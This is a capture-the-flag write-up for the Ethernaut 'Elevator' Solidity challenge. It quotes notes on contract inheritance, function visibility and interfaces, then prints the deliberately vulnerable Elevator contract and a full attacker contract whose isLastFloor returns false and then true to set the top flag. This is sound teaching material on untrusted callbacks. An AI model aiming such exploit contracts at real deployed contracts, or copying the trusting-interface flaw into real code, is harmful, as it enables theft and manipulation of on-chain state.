# Elevator

From StackExchange :

> When inheriting from a contract, you are creating a new instance that has -inherited- variables & functions from the parent contract. Therefore, if you modify any variable from this new contract (in address B), it is not affecting the original parent contract (in address A).

> Use of public, private, external or internal will depend whether you need to access methods from a contract, outside of a contract, from an inherited contract, etc, but be careful: all variables can ultimately be seen by using exploring tools. So this is more related to accessibility to methods.

> You will be able to modify a variable depending on the functions you define within your contract that allow to do so (and not from other inherited contracts). Other than that, there is no way to modify a variable (that's one of the key features from a blockchain).

Another piece of info :

> In order of increasing state permissions:
> pure: promises functions that will neither read from nor modify the state. Note: Pure replaces constant in more recent compilers.
> view: promises functions that will only read, but not modify the state
> default: [no modifier] promises functions that will read and modify the the state

Think of interfaces as an ABI (or API) declaration that forces contracts to all communicate in the same language/data structure. But interfaces do not prescribe the logic inside the functions, leaving the developer to implement his own business layer.

Contract Interfaces specifies the WHAT but not the HOW.

```solidity 
interface Building {
  function isLastFloor(uint) external returns (bool);
}
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

Elevator never implemented the isLastFloor function, and just uses it straight.

We can then pretend to be *Building* and call *goTo()*. This way *Elevator* calls us, the malicious contract, to invoke the *isLastFloor(uint _floor)*.

We then just return false then true to finish the question.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
  function goTo(uint _floor) external;
}
contract Building  {

  Elevator originalElevator;
  address myAddr = 0x36b19c3573beE32B810076d195FC15baFC72a562;
  address targetAddr = 0x2b7B4Ed3df29b7d52403d350B45B646bba074077;
  bool mySwitch;

  constructor(){
    originalElevator = Elevator(targetAddr);
    mySwitch = true;
  }

  function hackGoTo() public {
    originalElevator.goTo(1);
  }

  function isLastFloor(uint) external returns (bool){
    if (mySwitch) {
      mySwitch = false;
      return false;
    } else {
      return true;
    }
  }
}
```